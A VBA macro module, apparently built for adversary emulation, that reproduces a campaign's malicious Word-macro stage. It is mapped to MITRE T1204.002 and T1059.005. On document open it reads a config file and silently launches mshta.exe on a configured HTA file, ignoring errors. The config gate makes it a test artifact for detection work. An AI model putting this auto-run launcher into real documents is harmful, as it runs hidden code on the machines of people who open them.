Attribute VB_Name = "c0015Entry"
' ============================================================
' c0015 entry macro (benign, config-driven) — [LAB-SURROGATE]
' Maps to campaign: T1204.002 (user execution via Word macro),
' T1059.005 (VBA). Mirrors DFIR: macro triggers the HTA bootstrap.
'
' NO HARDCODED LAB VALUES: hta path / mshta path are read from
' %PUBLIC%\C0015\config.ini. If config is missing -> macro does
' nothing (this is the CONTROL path, not an error fallback).
' ============================================================
Private Sub Document_Open()
    On Error GoTo FailSafe

    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim iniPath As String
    iniPath = Environ("PUBLIC") & "\C0015\config.ini"
    If Not fso.FileExists(iniPath) Then Exit Sub   ' control: no config -> no action

    Dim ini As Object
    Set ini = fso.OpenTextFile(iniPath, 1)
    Dim htaPath As String, mshtaPath As String
    htaPath = "": mshtaPath = ""
    Do Until ini.AtEndOfStream
        Dim ln As String
        ln = ini.ReadLine
        If Left(ln, 9) = "hta_path=" Then htaPath = Mid(ln, 10)
        If Left(ln, 11) = "mshta_path=" Then mshtaPath = Mid(ln, 12)
    Loop
    ini.Close

    If htaPath = "" Then Exit Sub                   ' config incomplete -> stop (no fallback value)
    If mshtaPath = "" Then mshtaPath = "C:\Windows\System32\mshta.exe"  ' OS constant only

    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run """" & mshtaPath & """ """ & htaPath & """", 0, False
    Exit Sub
FailSafe:
    ' silent fail = control behavior; lab documents that no chain is created
End Sub
